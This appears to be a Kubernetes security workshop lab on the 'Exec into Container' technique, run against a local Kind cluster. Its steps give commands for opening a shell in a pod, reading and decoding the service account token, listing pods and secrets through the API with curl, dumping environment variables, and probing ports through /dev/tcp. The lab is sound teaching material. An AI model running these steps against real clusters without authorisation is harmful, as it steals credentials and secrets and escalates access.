# Exec into Container

An attacker who has gained `exec` permissions on pods can open an interactive shell inside a running container. From that shell they can read secrets, probe the internal network, and call the Kubernetes API — all without deploying any new workload.

## Description

`kubectl exec` is a legitimate debugging tool. Attackers who have obtained a kubeconfig with the `pods/exec` permission can use it to run arbitrary commands inside any running container. Because the session runs inside the pod's existing security context, the attacker immediately has:

- Access to all environment variables and mounted secrets inside the container.
- A network vantage point within the cluster (same CIDR as all other pods).
- The service account token mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`, which can be used to call the Kubernetes API.

This technique requires no new image pull and leaves no persistent artifact on disk unless the attacker explicitly writes one.

## Prerequisites

- A running Kubernetes cluster (these steps use a Kind cluster named `workshop-cluster`).
- `kubectl` installed and configured to connect to your cluster.
- The attacker has obtained a kubeconfig or token that grants `get pods` and `pods/exec` in the target namespace.

## Quick Start

### Step 1 — Deploy the target pod

Deploy the nginx pod that will be the exec target:

```bash
kubectl apply -f nginx.yaml
```

Wait for the pod to be ready:

```bash
kubectl wait --for=condition=Ready pod/nginx --timeout=60s
```

Expected output:

```
pod/nginx condition met
```

### Step 2 — Open an interactive shell

Exec into the running nginx container:

```bash
kubectl exec -it nginx -- /bin/sh
```

You now have a shell inside the container. The remaining steps are run from this shell.

### Step 3 — Harvest the mounted service account token

Every pod receives a service account token unless explicitly disabled. Read and decode it:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | head -c 500
```

Note the `sub` (service account name) and `namespace` fields in the decoded payload. This token can be used directly against the Kubernetes API.

### Step 4 — Call the Kubernetes API from inside the container

Use the mounted CA certificate and the service account token to query the API server:

```bash
APISERVER=https://kubernetes.default.svc
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# List pods in the current namespace
curl -s --cacert $CACERT \
     -H "Authorization: Bearer $TOKEN" \
     $APISERVER/api/v1/namespaces/default/pods | head -40

# List all secrets in the current namespace
curl -s --cacert $CACERT \
     -H "Authorization: Bearer $TOKEN" \
     $APISERVER/api/v1/namespaces/default/secrets
```

If the service account has been granted overly broad permissions, this is how an attacker elevates from a single compromised pod to full cluster access.

### Step 5 — Reconnaissance: read environment variables and mounted secrets

Dump all environment variables — these often contain database credentials, API keys, and internal service URLs:

```bash
env | sort
```

Check for additional mounted secret volumes:

```bash
mount | grep secret
ls /var/run/secrets/
```

### Step 6 — Internal network scanning

Probe the cluster network for other reachable services. The cluster DNS resolves services by name:

```bash
# Resolve the Kubernetes API service
nslookup kubernetes.default.svc.cluster.local

# Probe well-known internal ports on a few pod IPs
# (replace IPs with values from the pod list retrieved above)
for port in 80 443 8080 8443 6443; do
  (echo >/dev/tcp/kubernetes.default.svc/$port) 2>/dev/null \
    && echo "kubernetes.default.svc:$port OPEN" \
    || echo "kubernetes.default.svc:$port closed"
done
```

Exit the shell when done:

```bash
exit
```

### Step 7 — Run a one-shot command without an interactive shell

An attacker may want to run a single command quietly without an interactive session, which is harder to detect in audit logs as ongoing activity:

```bash
kubectl exec nginx -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

```bash
kubectl exec nginx -- env
```

## Cleanup

```bash
kubectl delete -f nginx.yaml
```

## Resources

- [kubectl exec](https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#exec)
- [Accessing the API from a Pod](https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/)
- [MITRE ATT&CK for Containers — Exec into Container](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Exec%20into%20container/)
